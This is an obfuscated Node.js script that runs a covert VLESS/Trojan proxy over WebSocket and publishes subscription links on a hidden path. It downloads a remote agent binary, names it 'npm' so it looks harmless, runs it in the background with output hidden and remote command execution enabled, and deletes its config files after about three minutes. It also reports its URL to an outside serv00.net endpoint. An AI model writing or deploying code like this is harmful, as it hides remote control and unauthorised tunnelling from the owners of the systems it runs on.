const _0x220ed1=_0x2ed8;function _0x2ed8(_0x1b6149,_0x1eff26){const _0x35f7aa=_0x35f7();return _0x2ed8=function(_0x2ed853,_0x92330b){_0x2ed853=_0x2ed853-0xc7;let _0x1c4ce1=_0x35f7aa[_0x2ed853];return _0x1c4ce1;},_0x2ed8(_0x1b6149,_0x1eff26);}(function(_0x30607a,_0x28a81a){const _0x5d3c52=_0x2ed8,_0x17b062=_0x30607a();while(!![]){try{const _0x8d3798=-parseInt(_0x5d3c52(0xec))/0x1+parseInt(_0x5d3c52(0xd9))/0x2+-parseInt(_0x5d3c52(0x10b))/0x3+parseInt(_0x5d3c52(0xed))/0x4*(-parseInt(_0x5d3c52(0xfd))/0x5)+parseInt(_0x5d3c52(0xff))/0x6+parseInt(_0x5d3c52(0x109))/0x7+-parseInt(_0x5d3c52(0x106))/0x8;if(_0x8d3798===_0x28a81a)break;else _0x17b062['push'](_0x17b062['shift']());}catch(_0x360913){_0x17b062['push'](_0x17b062['shift']());}}}(_0x35f7,0xb5b80));const os=require('os'),http=require('http'),fs=require('fs'),axios=require('axios'),net=require(_0x220ed1(0x11c)),path=require(_0x220ed1(0x12d)),crypto=require(_0x220ed1(0x130)),{Buffer}=require('buffer'),{exec,execSync}=require(_0x220ed1(0x114)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0x220ed1(0xd0)]||_0x220ed1(0xde),NEZHA_SERVER=process[_0x220ed1(0x141)][_0x220ed1(0x13d)]||'',NEZHA_PORT=process[_0x220ed1(0x141)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x220ed1(0x141)][_0x220ed1(0x122)]||'',DOMAIN=process[_0x220ed1(0x141)][_0x220ed1(0x11b)]||'1234.abc.com',AUTO_ACCESS=process[_0x220ed1(0x141)][_0x220ed1(0x124)]||!![],WSPATH=process['env']['WSPATH']||UUID['slice'](0x0,0x8),SUB_PATH=process[_0x220ed1(0x141)][_0x220ed1(0x107)]||_0x220ed1(0x10d),NAME=process['env'][_0x220ed1(0x10a)]||_0x220ed1(0xc8),PORT=process[_0x220ed1(0x141)]['PORT']||0x1eb4;function _0x35f7(){const _0x1e3444=['text/html','Status','text/plain','Hug','443','2053','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','application/dns-json','setsid\x20nohup\x20./npm\x20-s\x20','base64','arm64','UUID','pop','/bin/bash','npm\x20download\x20successfully','aarch64','readUInt8','createWriteStream','once','end','2415484wFytDA','&fp=chrome&type=ws&host=','8443','writeHead','https://arm64.ssss.nyc.mn/v1','16febb68-5236-469a-af4b-99e8fa316323','2096','then','log','2083','trim','split','test','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','npm\x20is\x20already\x20running,\x20skip\x20running...','from','https://speed.cloudflare.com/meta','trojan://','data','1296778HRHaJp','3352rIWfWO','Server\x20is\x20running\x20on\x20port\x20','join','Unknown','config.yaml','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','npm',':443?encryption=none&security=tls&sni=','get','npm\x20running\x20error:','stream','&type=A','error','decode','https://','readUInt16BE','2795DwZQaS','map','6735492vpjKkl','slice','sha224','createServer','close','includes','createHash','4437328QsHSlT','SUB_PATH','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','8559754PurqiU','NAME','1466820riLtTL','update','sub',':443?security=tls&sni=','asOrganization','url','write','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','\x20with\x20all\x20DNS\x20servers','child_process','find','index.html','arch','chmod\x20+x\x20npm','replace','1.1.1.1','DOMAIN','net','2087','error:\x20','unlink','Not\x20Found\x0a','writeFileSync','NEZHA_KEY','every','AUTO_ACCESS','Failed\x20to\x20resolve\x20','https://amd64.ssss.nyc.mn/v1','finish','concat','reduce','post','pipe','country','path','Answer','true','crypto','https://arm64.ssss.nyc.mn/agent','catch','Automatic\x20Access\x20Task\x20added\x20successfully','false','arm','length','\x20-p\x20','vless://','https://dns.google/resolve?name=','&path=%2F','hex','https://oooo.serv00.net/add-url','NEZHA_SERVER','connect','application/json','substr','env','toString'];_0x35f7=function(){return _0x1e3444;};return _0x35f7();}let ISP='';const GetISP=async()=>{const _0xc8ebf2=_0x220ed1;try{const _0x59a4c4=await axios[_0xc8ebf2(0xf5)](_0xc8ebf2(0xe9)),_0x76281e=_0x59a4c4[_0xc8ebf2(0xeb)];ISP=(_0x76281e[_0xc8ebf2(0x12c)]+'-'+_0x76281e[_0xc8ebf2(0x10f)])[_0xc8ebf2(0x119)](/ /g,'_');}catch(_0x5c77ac){ISP=_0xc8ebf2(0xf0);}};GetISP();const httpServer=http[_0x220ed1(0x102)]((_0x42bc5e,_0x465b11)=>{const _0x4f7adf=_0x220ed1;if(_0x42bc5e[_0x4f7adf(0x110)]==='/'){const _0x43a97e=path['join'](__dirname,_0x4f7adf(0x116));fs['readFile'](_0x43a97e,'utf8',(_0x29e4ae,_0x13e7e5)=>{const _0x1f4913=_0x4f7adf;if(_0x29e4ae){_0x465b11[_0x1f4913(0xdc)](0xc8,{'Content-Type':_0x1f4913(0x143)}),_0x465b11[_0x1f4913(0xd8)]('Hello\x20world!');return;}_0x465b11['writeHead'](0xc8,{'Content-Type':_0x1f4913(0x143)}),_0x465b11['end'](_0x13e7e5);});return;}else{if(_0x42bc5e[_0x4f7adf(0x110)]==='/'+SUB_PATH){const _0x57bcfb=_0x4f7adf(0x138)+UUID+'@'+DOMAIN+_0x4f7adf(0xf4)+DOMAIN+_0x4f7adf(0xda)+DOMAIN+_0x4f7adf(0x13a)+WSPATH+'#'+NAME+'-'+ISP,_0x4f117e=_0x4f7adf(0xea)+UUID+'@'+DOMAIN+_0x4f7adf(0x10e)+DOMAIN+_0x4f7adf(0xda)+DOMAIN+_0x4f7adf(0x13a)+WSPATH+'#'+NAME+'-'+ISP,_0xbc1f68=_0x57bcfb+'\x0a'+_0x4f117e,_0x44024b=Buffer[_0x4f7adf(0xe8)](_0xbc1f68)['toString'](_0x4f7adf(0xce));_0x465b11[_0x4f7adf(0xdc)](0xc8,{'Content-Type':_0x4f7adf(0xc7)}),_0x465b11['end'](_0x44024b+'\x0a');}else _0x465b11['writeHead'](0x194,{'Content-Type':_0x4f7adf(0xc7)}),_0x465b11[_0x4f7adf(0xd8)](_0x4f7adf(0x120));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x220ed1(0x119)](/-/g,''),DNS_SERVERS=['8.8.4.4',_0x220ed1(0x11a)];function resolveHost(_0x29e9b6){return new Promise((_0x45ad05,_0x903b71)=>{const _0x586afd=_0x2ed8;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x586afd(0xe5)](_0x29e9b6)){_0x45ad05(_0x29e9b6);return;}let _0x51a2c6=0x0;function _0x541ff4(){const _0x5cd88e=_0x586afd;if(_0x51a2c6>=DNS_SERVERS[_0x5cd88e(0x136)]){_0x903b71(new Error(_0x5cd88e(0x125)+_0x29e9b6+_0x5cd88e(0x113)));return;}const _0xcfe205=DNS_SERVERS[_0x51a2c6];_0x51a2c6++;const _0x4cf0c8=_0x5cd88e(0x139)+encodeURIComponent(_0x29e9b6)+_0x5cd88e(0xf8);axios['get'](_0x4cf0c8,{'timeout':0x1388,'headers':{'Accept':_0x5cd88e(0xcc)}})[_0x5cd88e(0xe0)](_0x4ab9be=>{const _0x3877da=_0x5cd88e,_0x3035e6=_0x4ab9be[_0x3877da(0xeb)];if(_0x3035e6[_0x3877da(0x144)]===0x0&&_0x3035e6['Answer']&&_0x3035e6['Answer'][_0x3877da(0x136)]>0x0){const _0x2b0ab2=_0x3035e6[_0x3877da(0x12e)][_0x3877da(0x115)](_0x5f26c2=>_0x5f26c2['type']===0x1);if(_0x2b0ab2){_0x45ad05(_0x2b0ab2[_0x3877da(0xeb)]);return;}}_0x541ff4();})[_0x5cd88e(0x132)](_0x4a7f36=>{_0x541ff4();});}_0x541ff4();});}function handleVlessConnection(_0x5940d7,_0x16c332){const _0x592656=_0x220ed1,[_0x41a8cc]=_0x16c332,_0x11c72b=_0x16c332['slice'](0x1,0x11);if(!_0x11c72b[_0x592656(0x123)]((_0x333833,_0x2725c3)=>_0x333833==parseInt(uuid[_0x592656(0x140)](_0x2725c3*0x2,0x2),0x10)))return![];let _0x2a13dd=_0x16c332[_0x592656(0x100)](0x11,0x12)[_0x592656(0xd5)]()+0x13;const _0x2900e7=_0x16c332[_0x592656(0x100)](_0x2a13dd,_0x2a13dd+=0x2)[_0x592656(0xfc)](0x0),_0x250d5d=_0x16c332[_0x592656(0x100)](_0x2a13dd,_0x2a13dd+=0x1)[_0x592656(0xd5)](),_0x4c762c=_0x250d5d==0x1?_0x16c332[_0x592656(0x100)](_0x2a13dd,_0x2a13dd+=0x4)[_0x592656(0xef)]('.'):_0x250d5d==0x2?new TextDecoder()[_0x592656(0xfa)](_0x16c332[_0x592656(0x100)](_0x2a13dd+0x1,_0x2a13dd+=0x1+_0x16c332['slice'](_0x2a13dd,_0x2a13dd+0x1)[_0x592656(0xd5)]())):_0x250d5d==0x3?_0x16c332[_0x592656(0x100)](_0x2a13dd,_0x2a13dd+=0x10)[_0x592656(0x129)]((_0x479f4f,_0x505866,_0x1dff9c,_0x5eee63)=>_0x1dff9c%0x2?_0x479f4f[_0x592656(0x128)](_0x5eee63[_0x592656(0x100)](_0x1dff9c-0x1,_0x1dff9c+0x1)):_0x479f4f,[])[_0x592656(0xfe)](_0x393fe6=>_0x393fe6[_0x592656(0xfc)](0x0)[_0x592656(0x142)](0x10))[_0x592656(0xef)](':'):'';_0x5940d7['send'](new Uint8Array([_0x41a8cc,0x0]));const _0x25ca29=createWebSocketStream(_0x5940d7);return resolveHost(_0x4c762c)[_0x592656(0xe0)](_0x352247=>{const _0x1b7d8f=_0x592656;net[_0x1b7d8f(0x13e)]({'host':_0x352247,'port':_0x2900e7},function(){const _0x342e86=_0x1b7d8f;this[_0x342e86(0x111)](_0x16c332[_0x342e86(0x100)](_0x2a13dd)),_0x25ca29['on'](_0x342e86(0xf9),()=>{})[_0x342e86(0x12b)](this)['on']('error',()=>{})[_0x342e86(0x12b)](_0x25ca29);})['on'](_0x1b7d8f(0xf9),()=>{});})[_0x592656(0x132)](_0x2af355=>{const _0x3e1ae0=_0x592656;net['connect']({'host':_0x4c762c,'port':_0x2900e7},function(){const _0x225b35=_0x2ed8;this[_0x225b35(0x111)](_0x16c332[_0x225b35(0x100)](_0x2a13dd)),_0x25ca29['on'](_0x225b35(0xf9),()=>{})[_0x225b35(0x12b)](this)['on'](_0x225b35(0xf9),()=>{})['pipe'](_0x25ca29);})['on'](_0x3e1ae0(0xf9),()=>{});}),!![];}function handleTrojanConnection(_0x54dab5,_0x30b615){const _0x3b1c52=_0x220ed1;try{if(_0x30b615[_0x3b1c52(0x136)]<0x3a)return![];const _0x203a2d=_0x30b615[_0x3b1c52(0x100)](0x0,0x38)[_0x3b1c52(0x142)](),_0x5d57d6=[UUID];let _0x361ed6=null;for(const _0x1be18b of _0x5d57d6){const _0x574687=crypto[_0x3b1c52(0x105)](_0x3b1c52(0x101))[_0x3b1c52(0x10c)](_0x1be18b)['digest'](_0x3b1c52(0x13b));if(_0x574687===_0x203a2d){_0x361ed6=_0x1be18b;break;}}if(!_0x361ed6)return![];let _0x56a1c8=0x38;_0x30b615[_0x56a1c8]===0xd&&_0x30b615[_0x56a1c8+0x1]===0xa&&(_0x56a1c8+=0x2);const _0xda5a9f=_0x30b615[_0x56a1c8];if(_0xda5a9f!==0x1)return![];_0x56a1c8+=0x1;const _0x161503=_0x30b615[_0x56a1c8];_0x56a1c8+=0x1;let _0x579231,_0x26f284;if(_0x161503===0x1)_0x579231=_0x30b615[_0x3b1c52(0x100)](_0x56a1c8,_0x56a1c8+0x4)['join']('.'),_0x56a1c8+=0x4;else{if(_0x161503===0x3){const _0x378848=_0x30b615[_0x56a1c8];_0x56a1c8+=0x1,_0x579231=_0x30b615[_0x3b1c52(0x100)](_0x56a1c8,_0x56a1c8+_0x378848)[_0x3b1c52(0x142)](),_0x56a1c8+=_0x378848;}else{if(_0x161503===0x4)_0x579231=_0x30b615[_0x3b1c52(0x100)](_0x56a1c8,_0x56a1c8+0x10)['reduce']((_0x3eb51d,_0x2ed50f,_0x12d9e2,_0x579616)=>_0x12d9e2%0x2?_0x3eb51d[_0x3b1c52(0x128)](_0x579616[_0x3b1c52(0x100)](_0x12d9e2-0x1,_0x12d9e2+0x1)):_0x3eb51d,[])['map'](_0x520130=>_0x520130[_0x3b1c52(0xfc)](0x0)[_0x3b1c52(0x142)](0x10))['join'](':'),_0x56a1c8+=0x10;else return![];}}_0x26f284=_0x30b615[_0x3b1c52(0xfc)](_0x56a1c8),_0x56a1c8+=0x2;_0x56a1c8<_0x30b615[_0x3b1c52(0x136)]&&_0x30b615[_0x56a1c8]===0xd&&_0x30b615[_0x56a1c8+0x1]===0xa&&(_0x56a1c8+=0x2);const _0x52650c=createWebSocketStream(_0x54dab5);return resolveHost(_0x579231)[_0x3b1c52(0xe0)](_0x37801d=>{const _0x3c6aa3=_0x3b1c52;net[_0x3c6aa3(0x13e)]({'host':_0x37801d,'port':_0x26f284},function(){const _0x29c813=_0x3c6aa3;_0x56a1c8<_0x30b615['length']&&this[_0x29c813(0x111)](_0x30b615[_0x29c813(0x100)](_0x56a1c8)),_0x52650c['on'](_0x29c813(0xf9),()=>{})[_0x29c813(0x12b)](this)['on'](_0x29c813(0xf9),()=>{})['pipe'](_0x52650c);})['on'](_0x3c6aa3(0xf9),()=>{});})[_0x3b1c52(0x132)](_0x31afb9=>{const _0x4a9423=_0x3b1c52;net[_0x4a9423(0x13e)]({'host':_0x579231,'port':_0x26f284},function(){const _0x43a4ea=_0x4a9423;_0x56a1c8<_0x30b615[_0x43a4ea(0x136)]&&this[_0x43a4ea(0x111)](_0x30b615[_0x43a4ea(0x100)](_0x56a1c8)),_0x52650c['on'](_0x43a4ea(0xf9),()=>{})[_0x43a4ea(0x12b)](this)['on']('error',()=>{})[_0x43a4ea(0x12b)](_0x52650c);})['on'](_0x4a9423(0xf9),()=>{});}),!![];}catch(_0x539d70){return![];}}wss['on']('connection',(_0x74e9ad,_0x17fcac)=>{const _0x238d3f=_0x220ed1,_0x1f38ec=_0x17fcac[_0x238d3f(0x110)]||'';_0x74e9ad[_0x238d3f(0xd7)]('message',_0x402bb2=>{const _0x57a04b=_0x238d3f;if(_0x402bb2['length']>0x11&&_0x402bb2[0x0]===0x0){const _0x5508f7=_0x402bb2[_0x57a04b(0x100)](0x1,0x11),_0x3d0bf3=_0x5508f7[_0x57a04b(0x123)]((_0x2a324f,_0x1b7749)=>_0x2a324f==parseInt(uuid[_0x57a04b(0x140)](_0x1b7749*0x2,0x2),0x10));if(_0x3d0bf3){!handleVlessConnection(_0x74e9ad,_0x402bb2)&&_0x74e9ad[_0x57a04b(0x103)]();return;}}!handleTrojanConnection(_0x74e9ad,_0x402bb2)&&_0x74e9ad[_0x57a04b(0x103)]();})['on'](_0x238d3f(0xf9),()=>{});});const getDownloadUrl=()=>{const _0x2df72c=_0x220ed1,_0x295b1e=os[_0x2df72c(0x117)]();return _0x295b1e===_0x2df72c(0x135)||_0x295b1e===_0x2df72c(0xcf)||_0x295b1e===_0x2df72c(0xd4)?!NEZHA_PORT?_0x2df72c(0xdd):_0x2df72c(0x131):!NEZHA_PORT?_0x2df72c(0x126):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x221b85=_0x220ed1;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x61cf70=getDownloadUrl(),_0x2c9d44=await axios({'method':_0x221b85(0xf5),'url':_0x61cf70,'responseType':_0x221b85(0xf7)}),_0x5c1b4a=fs[_0x221b85(0xd6)]('npm');return _0x2c9d44[_0x221b85(0xeb)][_0x221b85(0x12b)](_0x5c1b4a),new Promise((_0x50a475,_0x2ed782)=>{const _0x3297fc=_0x221b85;_0x5c1b4a['on'](_0x3297fc(0x127),()=>{const _0x358bd3=_0x3297fc;console[_0x358bd3(0xe1)](_0x358bd3(0xd3)),exec(_0x358bd3(0x118),_0x4f3663=>{if(_0x4f3663)_0x2ed782(_0x4f3663);_0x50a475();});}),_0x5c1b4a['on']('error',_0x2ed782);});}catch(_0xc2e541){throw _0xc2e541;}},runnz=async()=>{const _0x5b825e=_0x220ed1;try{const _0x49d786=execSync(_0x5b825e(0x112),{'encoding':'utf-8'});if(_0x49d786[_0x5b825e(0xe3)]()!==''){console[_0x5b825e(0xe1)](_0x5b825e(0xe7));return;}}catch(_0x5d8794){}await downloadFile();let _0x561db3='',_0x16c5c7=[_0x5b825e(0xc9),_0x5b825e(0xdb),_0x5b825e(0xdf),_0x5b825e(0x11d),_0x5b825e(0xe2),_0x5b825e(0xca)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x7744ee=_0x16c5c7[_0x5b825e(0x104)](NEZHA_PORT)?'--tls':'';_0x561db3=_0x5b825e(0xcd)+NEZHA_SERVER+':'+NEZHA_PORT+_0x5b825e(0x137)+NEZHA_KEY+'\x20'+_0x7744ee+_0x5b825e(0xe6);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x35e3e1=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x5b825e(0xe4)](':')[_0x5b825e(0xd1)]():'',_0x136504=_0x16c5c7[_0x5b825e(0x104)](_0x35e3e1)?_0x5b825e(0x12f):_0x5b825e(0x134),_0x30db43='client_secret:\x20'+NEZHA_KEY+_0x5b825e(0xf2)+NEZHA_SERVER+_0x5b825e(0xcb)+_0x136504+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x5b825e(0x121)]('config.yaml',_0x30db43);}_0x561db3='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console[_0x5b825e(0xe1)](_0x5b825e(0x108));return;}}try{exec(_0x561db3,{'shell':_0x5b825e(0xd2)},_0x271b29=>{const _0x281156=_0x5b825e;if(_0x271b29)console[_0x281156(0xf9)](_0x281156(0xf6),_0x271b29);else console['log']('npm\x20is\x20running');});}catch(_0x5d623d){console['error'](_0x5b825e(0x11e)+_0x5d623d);}};async function addAccessTask(){const _0x4e77de=_0x220ed1;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x4f198c=_0x4e77de(0xfb)+DOMAIN+'/'+SUB_PATH;try{const _0x612c95=await axios[_0x4e77de(0x12a)](_0x4e77de(0x13c),{'url':_0x4f198c},{'headers':{'Content-Type':_0x4e77de(0x13f)}});console['log'](_0x4e77de(0x133));}catch(_0x51526d){}}const delFiles=()=>{const _0x38967c=_0x220ed1;fs[_0x38967c(0x11f)](_0x38967c(0xf3),()=>{}),fs[_0x38967c(0x11f)](_0x38967c(0xf1),()=>{});};httpServer['listen'](PORT,()=>{const _0x328db9=_0x220ed1;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x328db9(0xee)+PORT);});
